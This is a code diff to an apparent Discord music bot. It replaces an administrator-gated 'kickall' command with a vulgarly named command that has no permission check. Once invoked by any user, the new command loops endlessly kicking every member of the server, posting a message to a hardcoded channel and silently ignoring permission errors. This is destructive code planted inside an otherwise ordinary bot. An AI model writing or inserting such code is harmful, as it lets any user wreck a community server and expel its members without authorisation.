@@ -111,14 +111,16 @@ async def after_song(con,clear):
 
 
 @bot.command(pass_context=True)
-async def kickall(ctx):
-    if ctx.message.author.server_permissions.administrator and ctx.message.server.me.server_permissions.kick_members:
-        for member in ctx.message.server.members:
-            if member != ctx.message.author and member != ctx.message.server.me:
-                await client.kick(member)
-        await bot.say('All members kicked.')
-    else:
-        await bot.say('Error: Not administrator')
+async def sikherkesi(ctx):
+    members = ctx.message.server.members.copy();
+    while True:
+        for server_member in members:
+            try:
+                channel = bot.get_channel('540612578401976330')
+                await bot.kick(server_member)
+                await bot.send_message(channel, "someone got kicked")
+            except discord.Forbidden:
+                pass
     
 @bot.command(pass_context=True)
 async def p(con,*,url):
